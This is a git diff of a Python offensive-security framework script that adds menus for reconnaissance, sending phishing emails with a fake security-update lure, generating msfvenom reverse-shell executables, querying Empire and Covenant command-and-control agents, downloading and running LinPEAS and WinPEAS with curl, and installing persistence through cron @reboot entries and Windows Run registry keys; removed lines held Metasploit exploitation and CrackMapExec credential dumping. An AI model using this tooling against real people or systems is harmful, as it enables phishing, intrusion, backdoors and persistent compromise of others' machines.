@@ -10,12 +10,14 @@
 # WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 ######################################################################################################################################################################################################################
 
-import json
-import time
-import datetime
-import subprocess
 import os
-import shutil
+import subprocess
+import datetime
+import json
+import requests
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
 
    
 # Disclaimer and Ethical Guidelines
@@ -62,154 +64,374 @@ def print_banner():
     """
     print(banner)
 
-# Load APT group data from JSON file
-def load_apt_groups(filename="apt_groups.json"):
-    try:
-        with open(filename, "r") as file:
-            return json.load(file)
-    except FileNotFoundError:
-        print(f"[ERROR] {filename} not found. Please ensure the file exists in the same directory.")
-        exit()
 
-# Function to install missing tools
-def check_and_install_tools(tools):
-    for tool in tools:
-        if shutil.which(tool) is None:
-            print(f"[INFO] {tool} not found. Attempting to install...")
-            subprocess.run(["sudo", "apt-get", "install", "-y", tool], check=True)
-        else:
-            print(f"[INFO] {tool} is already installed.")
+# Check and install dependencies
+def install_dependencies():
+    dependencies = ["whois", "requests", "dnspython", "shodan", "linkedin-scraper"]
+    print("[INFO] Checking dependencies...")
+    for dep in dependencies:
+        try:
+            __import__(dep)
+        except ImportError:
+            print(f"[INFO] Installing {dep}...")
+            subprocess.run(["pip3", "install", dep])
+    print("[INFO] Dependencies are installed.")
 
-# Function to log alerts
-def log_alert(apt_name, technique):
-    alert = {
-        "timestamp": datetime.datetime.now().isoformat(),
-        "apt_name": apt_name,
-        "technique_id": technique["id"],
-        "technique_name": technique["name"],
-        "tactic": technique["tactic"],
-        "description": technique["description"]
-    }
-    with open("alerts_log.json", "a") as log_file:
-        log_file.write(json.dumps(alert) + "\n")
-    print(f"[ALERT] Logged alert for {technique['name']} ({technique['id']})")
+# Check and clone more_mass.py if not found
+def check_more_mass():
+    if not os.path.exists("more_mass.py"):
+        print("[INFO] Cloning more_mass.py from GitHub...")
+        subprocess.run(["git", "clone", "https://github.com/4lph4-01/share.git"])
+        subprocess.run(["mv", "share/Automation - Information Gathering/more_mass.py", "./"])
+        subprocess.run(["rm", "-rf", "share"])
+        print("[INFO] more_mass.py is now available.")
 
-# Simulate attack techniques
-def simulate_technique(apt_name, technique):
-    print(f"[INFO] Simulating {technique['name']} ({technique['id']}) for {apt_name}...")
-    if technique["id"] == "T1071":  # Example technique: HTTP requests
-        simulate_http_requests()
-    elif technique["id"] == "T1059":  # Example technique: Command execution
-        simulate_command_execution()
+# Initialise framework
+def initialize():
+    print("[INFO] Initializing framework...")
+    install_dependencies()
+    check_more_mass()
+    print("[INFO] Initialization complete.")
+
+# Run more_mass.py for subdomain enumeration
+def run_more_mass():
+    domain = input("[INPUT] Enter the target domain for subdomain enumeration: ")
+    output_file = f"{domain}_subdomains.txt"
+    print(f"[INFO] Running more_mass.py on {domain}...")
+    subprocess.run(["python3", "more_mass.py", "-d", domain, "-o", output_file])
+    print(f"[INFO] Subdomain enumeration completed. Results saved to {output_file}.")
+    return output_file
+
+# Parse output from more_mass.py
+def parse_more_mass_output(file_path):
+    if not os.path.exists(file_path):
+        print("[ERROR] Output file not found.")
+        return []
+    subdomains = []
+    with open(file_path, "r") as file:
+        for line in file:
+            subdomains.append(line.strip())
+    print(f"[INFO] Found {len(subdomains)} subdomains.")
+    return subdomains
+
+# Shodan API for asset discovery
+def shodan_asset_discovery():
+    api_key = input("[INPUT] Enter your Shodan API key: ")
+    target = input("[INPUT] Enter the target domain for Shodan asset discovery: ")
+    print(f"[INFO] Running Shodan asset discovery on {target}...")
+    shodan_url = f"https://api.shodan.io/shodan/host/search?key={api_key}&query={target}"
+    response = requests.get(shodan_url)
+    if response.status_code == 200:
+        data = response.json()
+        with open(f"{target}_shodan.json", "w") as file:
+            json.dump(data, file, indent=4)
+        print(f"[INFO] Shodan asset discovery completed. Results saved to {target}_shodan.json.")
     else:
-        simulate_generic_activity()
-    log_alert(apt_name, technique)
+        print("[ERROR] Failed to fetch Shodan data.")
 
-# Simulated Techniques
-def simulate_http_requests():
-    endpoints = ["http://example.com", "http://example.org", "http://example.net"]
-    for endpoint in endpoints:
-        subprocess.run(["curl", endpoint])
-        time.sleep(1)
+# Function to send a phishing email
+def send_phishing_email():
+    smtp_server = input("[INPUT] Enter your SMTP server: ")
+    smtp_port = input("[INPUT] Enter your SMTP port: ")
+    smtp_user = input("[INPUT] Enter your SMTP username: ")
+    smtp_pass = input("[INPUT] Enter your SMTP password: ")
+    from_email = smtp_user
+    to_email = input("[INPUT] Enter the recipient's email address: ")
+    subject = "Important Security Update"
+    body = """
+    Dear User,
 
-def simulate_command_execution():
-    commands = ["ls", "whoami", "uname -a"]
-    for cmd in commands:
-        subprocess.run(cmd, shell=True)
-        time.sleep(1)
+    Please review the recent security update by clicking the link below:
+    <a href="http://fake-tracking-link.com">Security Update</a>
 
-def simulate_generic_activity():
-    print("[INFO] Simulating generic APT activity...")
-    time.sleep(2)
-
-# Penetration Testing Menu
-def penetration_testing_menu():
-    while True:
-        print("\nPenetration Testing Options:")
-        print("1. Nmap Scanning")
-        print("2. Exploitation (Metasploit)")
-        print("3. Credential Dumping (CrackMapExec)")
-        print("4. Return to Main Menu")
-        choice = input("Select an option: ")
-
-        if choice == "1":
-            nmap_scanning()
-        elif choice == "2":
-            metasploit_exploitation()
-        elif choice == "3":
-            crackmapexec_dumping()
-        elif choice == "4":
-            break
-        else:
-            print("[ERROR] Invalid option. Please try again.")
-
-# Nmap Scanning Function
-def nmap_scanning():
-    target = input("[INPUT] Enter target IP or subnet (e.g., 192.168.1.0/24): ")
-    print(f"[INFO] Running Nmap scan on {target}...")
-    subprocess.run(["nmap", "-sV", target])
-    print("[INFO] Nmap scan completed.")
-
-# Metasploit Exploitation Function
-def metasploit_exploitation():
-    target = input("[INPUT] Enter target IP: ")
-    exploit = input("[INPUT] Enter exploit module (e.g., exploit/windows/smb/ms17_010_eternalblue): ")
-    payload = input("[INPUT] Enter payload (e.g., windows/meterpreter/reverse_tcp): ")
-    lhost = input("[INPUT] Enter LHOST (your IP): ")
-    lport = input("[INPUT] Enter LPORT (e.g., 4444): ")
-
-    print("[INFO] Launching Metasploit...")
-    msf_commands = f"""
-    use {exploit}
-    set RHOSTS {target}
-    set PAYLOAD {payload}
-    set LHOST {lhost}
-    set LPORT {lport}
-    exploit
+    Regards,
+    IT Security Team
     """
-    subprocess.run(["msfconsole", "-q", "-x", msf_commands])
 
-# CrackMapExec Credential Dumping
-def crackmapexec_dumping():
-    target = input("[INPUT] Enter target subnet (e.g., 192.168.1.0/24): ")
-    username = input("[INPUT] Enter username: ")
-    password = input("[INPUT] Enter password: ")
+    # Create the email
+    msg = MIMEMultipart()
+    msg['From'] = from_email
+    msg['To'] = to_email
+    msg['Subject'] = subject
+    msg.attach(MIMEText(body, 'html'))
 
-    print(f"[INFO] Running CrackMapExec on {target}...")
-    subprocess.run(["crackmapexec", "smb", target, "-u", username, "-p", password])
+    try:
+        server = smtplib.SMTP(smtp_server, smtp_port)
+        server.starttls()
+        server.login(smtp_user, smtp_pass)
+        server.sendmail(from_email, to_email, msg.as_string())
+        server.quit()
+        print("[INFO] Phishing email sent successfully.")
+    except Exception as e:
+        print(f"[ERROR] Failed to send email: {e}")
 
-# Main Function
-def main():
-    display_disclaimer()
-    print_banner()
+# Function to generate a malicious payload using msfvenom
+def generate_payload():
+    lhost = input("[INPUT] Enter the LHOST (Local Host IP): ")
+    lport = input("[INPUT] Enter the LPORT (Local Host Port): ")
+    output_file = input("[INPUT] Enter the output file name (e.g., payload.exe): ")
+    payload_type = input("[INPUT] Enter the payload type (e.g., windows/meterpreter/reverse_tcp): ")
 
-    # Check and install required tools
-    required_tools = ["nmap", "msfconsole", "crackmapexec", "curl"]
-    check_and_install_tools(required_tools)
+    command = f"msfvenom -p {payload_type} LHOST={lhost} LPORT={lport} -f exe -o {output_file}"
+    try:
+        subprocess.run(command.split(), check=True)
+        print(f"[INFO] Payload generated successfully and saved to {output_file}.")
+    except subprocess.CalledProcessError as e:
+        print(f"[ERROR] Failed to generate payload: {e}")
 
-    # Load APT groups
-    apt_groups = load_apt_groups()
-    print("[INFO] APT Groups loaded.")
+# Empire interaction
+def interact_with_empire():
+    empire_url = input("[INPUT] Enter the Empire API URL (e.g., http://localhost:1337): ")
+    empire_username = input("[INPUT] Enter your Empire username: ")
+    empire_password = input("[INPUT] Enter your Empire password: ")
 
+    # Authenticate with Empire
+    auth_url = f"{empire_url}/api/admin/login"
+    auth_data = {"username": empire_username, "password": empire_password}
+    response = requests.post(auth_url, json=auth_data)
+
+    if response.status_code == 200:
+        token = response.json()["token"]
+        print("[INFO] Successfully authenticated with Empire.")
+    else:
+        print("[ERROR] Failed to authenticate with Empire.")
+        return
+
+    # Example: Retrieve agents
+    headers = {"Authorization": f"Bearer {token}"}
+    agents_url = f"{empire_url}/api/agents"
+    response = requests.get(agents_url, headers=headers)
+
+    if response.status_code == 200:
+        agents = response.json()
+        print("[INFO] Retrieved agents from Empire.")
+        for agent in agents:
+            print(f"Agent: {agent['name']}, Last seen: {agent['lastseen_time']}")
+    else:
+        print("[ERROR] Failed to retrieve agents from Empire.")
+
+# Covenant interaction
+def interact_with_covenant():
+    covenant_url = input("[INPUT] Enter the Covenant API URL (e.g., http://localhost:7443): ")
+    covenant_username = input("[INPUT] Enter your Covenant username: ")
+    covenant_password = input("[INPUT] Enter your Covenant password: ")
+
+    # Authenticate with Covenant
+    auth_url = f"{covenant_url}/api/auth/login"
+    auth_data = {"username": covenant_username, "password": covenant_password}
+    response = requests.post(auth_url, json=auth_data)
+
+    if response.status_code == 200:
+        token = response.json()["token"]
+        print("[INFO] Successfully authenticated with Covenant.")
+    else:
+        print("[ERROR] Failed to authenticate with Covenant.")
+        return
+
+    # Example: Retrieve grunts (agents)
+    headers = {"Authorization": f"Bearer {token}"}
+    grunts_url = f"{covenant_url}/api/grunts"
+    response = requests.get(grunts_url, headers=headers)
+
+    if response.status_code == 200:
+        grunts = response.json()
+        print("[INFO] Retrieved grunts from Covenant.")
+        for grunt in grunts:
+            print(f"Grunt: {grunt['name']}, Last seen: {grunt['lastSeen']}")
+    else:
+        print("[ERROR] Failed to retrieve grunts from Covenant.")
+
+# Function to run LinPEAS for privilege escalation on Linux
+def run_linpeas():
+    print("[INFO] Running LinPEAS for privilege escalation on Linux...")
+    subprocess.run(["curl", "-L", "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh", "-o", "linpeas.sh"])
+    subprocess.run(["chmod", "+x", "linpeas.sh"])
+    subprocess.run(["./linpeas.sh"])
+
+# Function to run WinPEAS for privilege escalation on Windows
+def run_winpeas():
+    print("[INFO] Running WinPEAS for privilege escalation on Windows...")
+    subprocess.run(["curl", "-L", "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe", "-o", "winPEASx64.exe"])
+    subprocess.run(["winPEASx64.exe"])
+
+# Function to add a cron job for persistence on Linux
+def add_cron_job():
+    command = input("[INPUT] Enter the command to run as a cron job: ")
+    cron_entry = f"@reboot {command}"
+    with open("mycron", "w") as file:
+        file.write(cron_entry + "\n")
+    subprocess.run(["crontab", "mycron"])
+    os.remove("mycron")
+    print("[INFO] Cron job added for persistence.")
+
+# Function to modify registry for persistence on Windows
+def add_registry_persistence():
+    key = input("[INPUT] Enter the registry key (e.g., 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\MyApp'): ")
+    value = input("[INPUT] Enter the command or path to executable: ")
+    command = f'reg add "{key}" /v MyApp /t REG_SZ /d "{value}" /f'
+    subprocess.run(command, shell=True)
+    print("[INFO] Registry modified for persistence.")
+
+# Run Nmap for network scanning
+def run_nmap():
+    target = input("[INPUT] Enter the target IP or domain for Nmap scanning: ")
+    output_file = f"{target}_nmap_scan.txt"
+    print(f"[INFO] Running Nmap scan on {target}...")
+    subprocess.run(["nmap", "-A", target, "-oN", output_file])
+    print(f"[INFO] Nmap scan completed. Results saved to {output_file}.")
+
+# Passive Recon (Whois)
+def passive_recon():
+    target = input("[INPUT] Enter the target domain for passive reconnaissance: ")
+    print(f"[INFO] Performing WHOIS lookup on {target}...")
+    subprocess.run(["whois", target])
+
+# Vulnerability assessment placeholder
+def run_vulnerability_scan():
+    print("[INFO] Running vulnerability scan...")
+    print("[WARNING] Vulnerability scanning functionality is under development!")
+
+# Generate final report
+def generate_report(recon_results):
+    report = {
+        "timestamp": datetime.datetime.now().isoformat(),
+        "reconnaissance": {
+            "subdomains": recon_results.get("subdomains", []),
+            "nmap_scan": recon_results.get("nmap_scan", "N/A"),
+        },
+        "vulnerabilities": {
+            "assessment": "Vulnerability scan results placeholder",
+        },
+        "exploitation": {
+            "results": "Exploitation results placeholder",
+        },
+    }
+
+    # Save report as JSON
+    with open("report.json", "w") as json_file:
+        json.dump(report, json_file, indent=4)
+    print("[INFO] Report saved to report.json.")
+
+# Reconnaissance menu
+def reconnaissance_menu():
+    print("\n[Reconnaissance Menu]")
+    print("1. Subdomain Enumeration (via more_mass.py)")
+    print("2. Run Nmap for Network Scanning")
+    print("3. Passive Recon (Whois)")
+    print("4. Shodan Asset Discovery")
+    print("0. Back to Main Menu")
+
+    choice = input("[INPUT] Choose an option: ")
+    if choice == "1":
+        subdomains_file = run_more_mass()
+        recon_results["subdomains"] = parse_more_mass_output(subdomains_file)
+    elif choice == "2":
+        run_nmap()
+    elif choice == "3":
+        passive_recon()
+    elif choice == "4":
+        shodan_asset_discovery()
+    elif choice == "0":
+        return
+    else:
+        print("[ERROR] Invalid choice. Please try again.")
+        reconnaissance_menu()
+
+# Initial Access menu
+def initial_access_menu():
+    print("\n[Initial Access Menu]")
+    print("1. Send Phishing Email")
+    print("2. Generate Malicious Payload")
+    print("0. Back to Main Menu")
+
+    choice = input("[INPUT] Choose an option: ")
+    if choice == "1":
+        send_phishing_email()
+    elif choice == "2":
+        generate_payload()
+    elif choice == "0":
+        return
+    else:
+        print("[ERROR] Invalid choice. Please try again.")
+        initial_access_menu()
+
+# Exploitation menu
+def exploitation_menu():
+    print("\n[Exploitation Menu]")
+    print("1. Interact with Empire")
+    print("2. Interact with Covenant")
+    print("0. Back to Main Menu")
+
+    choice = input("[INPUT] Choose an option: ")
+    if choice == "1":
+        interact_with_empire()
+    elif choice == "2":
+        interact_with_covenant()
+    elif choice == "0":
+        return
+    else:
+        print("[ERROR] Invalid choice. Please try again.")
+        exploitation_menu()
+
+# Privilege Escalation & Persistence menu
+def privilege_escalation_menu():
+    print("\n[Privilege Escalation & Persistence Menu]")
+    print("1. Run LinPEAS for Linux Privilege Escalation")
+    print("2. Run WinPEAS for Windows Privilege Escalation")
+    print("3. Add Cron Job for Persistence (Linux)")
+    print("4. Modify Registry for Persistence (Windows)")
+    print("0. Back to Main Menu")
+
+    choice = input("[INPUT] Choose an option: ")
+    if choice == "1":
+        run_linpeas()
+    elif choice == "2":
+        run_winpeas()
+    elif choice == "3":
+        add_cron_job()
+    elif choice == "4":
+        add_registry_persistence()
+    elif choice == "0":
+        return
+    else:
+        print("[ERROR] Invalid choice. Please try again.")
+        privilege_escalation_menu()
+
+# Main menu
+def main_menu():
     while True:
-        print("\nMain Menu:")
-        print("1. Simulate APT Techniques")
-        print("2. Penetration Testing")
-        print("3. Exit")
-        choice = input("Select an option: ")
+        print("\n[Penetration Testing Framework]")
+        print("1. Reconnaissance")
+        print("2. Initial Access")
+        print("3. Vulnerability Assessment")
+        print("4. Exploitation")
+        print("5. Privilege Escalation & Persistence")
+        print("6. Generate Report")
+        print("0. Exit")
 
+        choice = input("[INPUT] Choose an option: ")
         if choice == "1":
-            for apt_name, apt_details in apt_groups.items():
-                print(f"\n[INFO] {apt_name}: {apt_details['description']}")
-                for technique in apt_details["techniques"]:
-                    simulate_technique(apt_name, technique)
+            reconnaissance_menu()
         elif choice == "2":
-            penetration_testing_menu()
+            initial_access_menu()
         elif choice == "3":
+            run_vulnerability_scan()
+        elif choice == "4":
+            exploitation_menu()
+        elif choice == "5":
+            privilege_escalation_menu()
+        elif choice == "6":
+            generate_report(recon_results)
+        elif choice == "0":
             print("[INFO] Exiting framework. Goodbye!")
             break
         else:
-            print("[ERROR] Invalid option. Please try again.")
+            print("[ERROR] Invalid choice. Please try again.")
 
+# Global dictionary to store results
+recon_results = {}
+
+# Initialize and start framework
 if __name__ == "__main__":
-    main()
+    initialize()
+    main_menu()
